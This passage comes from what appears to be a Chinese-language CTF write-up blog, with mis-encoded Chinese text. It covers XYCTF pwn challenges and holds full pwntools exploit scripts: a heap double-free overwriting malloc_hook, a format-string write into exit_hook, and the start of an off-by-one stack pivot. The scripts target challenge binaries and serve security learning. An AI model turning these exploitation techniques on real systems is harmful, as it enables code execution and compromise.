ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Menu</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;&gt;&gt;&gt; &quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>index<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Menu<span class="token punctuation">(</span><span class="token string">b&quot;1&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input note idx\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input content\n&quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;åˆ›å»ºäº†ä¸€ä¸ªindex:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">çš„chunk&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Menu<span class="token punctuation">(</span><span class="token string">b&quot;2&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input note idx\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;åˆ é™¤ä¸€ä¸ªindex:</span><span class="token interpolation"><span class="token punctuation">{</span>index<span class="token punctuation">}</span></span><span class="token string">çš„chunk&quot;</span></span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Menu<span class="token punctuation">(</span><span class="token string">b&quot;3&quot;</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;please input note idx\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>
<span class="token comment">#æ„é€ double free</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x61</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x61</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
got_addr <span class="token operator">=</span> <span class="token number">0x401050</span>
bss_addr <span class="token operator">=</span> <span class="token number">0x404070</span> 
<span class="token comment"># æ§åˆ¶fd æŒ‡å‘æˆ‘ä»¬æƒ³è¦mallocçš„åœ°å€</span>
create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># æ§åˆ¶bss_addræ®µ</span>
create<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;å¼€å§‹æ³„éœ²&quot;</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> show<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token comment"># print(&quot;res&quot;,u64(res[16:24]))</span>
<span class="token comment">#ç®—å‡ºlibc</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2021024</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xe3b31</span>
malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7f291e7a2b70</span><span class="token operator">-</span><span class="token number">0x7f291e5b6000</span> <span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;malloc_hook:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;æˆåŠŸæ³„éœ²&quot;</span><span class="token punctuation">)</span>
<span class="token comment">#ç¬¬äºŒæ¬¡double free</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ä¸¤ä¸ªfastbinæƒ…å†µ&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># input(&quot;e&quot;)</span>
delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> 
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;æ„é€ double free&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token string">b&quot;aaaaaaaa&quot;</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;tcacheåˆ é™¤å®Œæ¯•&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># ä¿®æ”¹malloc_hook</span>
create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook <span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;malloc_hook:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">b&quot;a&quot;</span><span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="fmt" tabindex="-1"><a class="header-anchor" href="#fmt" aria-hidden="true">#</a> fmt</h2><blockquote><p>scanfå’Œfmtç±»ä¼¼ æœ‰æ ¼å¼åŒ– æˆ‘ä»¬å¯ä»¥é€šè¿‡%n$pæ¥å®ç°æŒ‡å®šç¬¬å‡ ä¸ªå‚æ•°åœ°å€å†™å…¥å†…å®¹ ç„¶åå‰å…­ä¸ªå‚æ•°éƒ½æ˜¯å¯„å­˜å™¨ åé¢çš„å‚æ•°å°±æ˜¯æ ˆåœ°å€äº† æŒ‰ç…§æ ˆé¡¶ä¾æ¬¡é€‰æ‹©</p></blockquote><ul><li>è¿™é¢˜æˆ‘ä»¬æ‹¥æœ‰ä¸¤æ¬¡å†™å…¥æœºä¼š æˆ‘ä»¬å¯ä»¥ç¬¬ä¸€æ¬¡å†™å…¥ç›®æ ‡åœ°å€ ç„¶åç¬¬äºŒæ¬¡é€šè¿‡scanfæ¥å‘ç›®æ ‡åœ°å€å†™å…¥æ•°æ®</li><li>æˆ‘ä»¬é€‰æ‹©æ‰“exit_hook å†™å…¥one_gadget å°±å¯ä»¥æˆåŠŸåŠ«æŒäº†</li></ul><h3 id="exit-hookåœ°å€å†™å…¥æ ˆ" tabindex="-1"><a class="header-anchor" href="#exit-hookåœ°å€å†™å…¥æ ˆ" aria-hidden="true">#</a> exit hookåœ°å€å†™å…¥æ ˆ:</h3><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422212450209.png" alt="image-20240422212450209" tabindex="0" loading="lazy"><figcaption>image-20240422212450209</figcaption></figure><h3 id="é€‰æ‹©" tabindex="-1"><a class="header-anchor" href="#é€‰æ‹©" aria-hidden="true">#</a> é€‰æ‹©</h3><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token operator">%</span><span class="token number">7</span>$ld
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="è„šæœ¬-1" tabindex="-1"><a class="header-anchor" href="#è„šæœ¬-1" aria-hidden="true">#</a> è„šæœ¬</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


<span class="token comment"># file_name = &quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;127.0.0.1&quot;</span>
port <span class="token operator">=</span> <span class="token number">53235</span>


<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b main&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

res <span class="token operator">=</span> ru<span class="token punctuation">(</span><span class="token string">b&quot;\n&quot;</span><span class="token punctuation">)</span>
printf_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;printf_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> printf_addr <span class="token operator">-</span> <span class="token number">0x61CC0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;libc_base:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
exit_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">2240352</span><span class="token operator">+</span><span class="token number">8</span>
exit_hook_args_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">2238824</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">0x522C0</span>
one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">0xe3b2e</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_hook:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;exit_hook args&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exit_hook_args_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;system_addr:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;one_gadget:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># cannary-8ä½ç½®</span>
cannary <span class="token operator">=</span> libc_base <span class="token operator">+</span><span class="token number">2045376</span><span class="token operator">+</span><span class="token number">0x28</span> <span class="token operator">-</span><span class="token number">0x8</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;cannary:&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>cannary<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># %7$d å°±æ˜¯rsp+8</span>
<span class="token comment"># ç¬¬ä¸€æ¬¡æ„é€ </span>
<span class="token comment"># payload = b&quot;%64s%13$s&quot;.ljust(0x8,b&quot;a&quot;)+p64(cannary)*3</span>
payload <span class="token operator">=</span><span class="token string">b&quot;%7$ld&quot;</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b&quot;\x00&quot;</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>exit_hook_addr<span class="token punctuation">)</span>
<span class="token comment"># payload =b&quot;%13$s&quot;</span>
sd<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
<span class="token comment"># payload = b&quot;d&quot;*0x38+p64(cannary)+b&quot;c&quot;.ljust(32,b&quot;c&quot;)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="guestbook" tabindex="-1"><a class="header-anchor" href="#guestbook" aria-hidden="true">#</a> GuestBook</h2><blockquote><p>å­˜åœ¨æ ˆçš„off_by_oneæ¼æ´ æˆ‘ä»¬é€šè¿‡æå‰åœ¨æ ˆé‡Œé¢å†™æ»¡backdooråœ°å€ ç„¶åé€šè¿‡ä¿®æ”¹è¿”å›åœ°å€æœ€åä¸€ä¸ªå­—èŠ‚ æ¥å®ç°æ ˆè¿ç§»è¿”å›åˆ°å­˜æ”¾backdoorçš„æ ˆåœ°å€ä¸Š åªè¦å†™æ»¡äº† æ¦‚ç‡è¿˜æŒºå¤§ ç„¶åå°±å¯ä»¥åœ¨ç¬¬äºŒæ¬¡è¿”å›çš„æ—¶å€™è§¦å‘backdoorå‡½æ•°</p></blockquote><figure><img src="https://awaqwqa.github.io/img/xyctf/image-20240422213216922.png" alt="image-20240422213216922" tabindex="0" loading="lazy"><figcaption>image-20240422213216922</figcaption></figure><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> time

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&#39;linux&#39;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&#39;amd64&#39;</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">&#39;debug&#39;</span><span class="token punctuation">)</span>
<span class="token comment"># context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&#39;byobu&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;sp&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;-h&#39;</span><span class="token punctuation">]</span>


file_name <span class="token operator">=</span> <span class="token string">&quot;./vuln&quot;</span>
url <span class="token operator">=</span> <span class="token string">&quot;xyctf.top&quot;</span>
port <span class="token operator">=</span> <span class="token number">34019</span>

<span class="token comment"># elf = ELF(file_name)</span>
<span class="token comment"># p= process(file_name)</span>
<span class="token comment"># p = gdb.debug(file_name,&quot;b *0x401321&quot;)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span>url<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

sd <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">,</span>s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>s<span class="token punctuation">)</span>
rc <span class="token operator">=</span> <span class="token keyword">lambda</span> n <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> s <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
ra <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#39;\x00&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">,</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;index\n&quot;</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">b&quot;name:\n&quot;</span><span class="token punctuation">)</span>
    sd<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
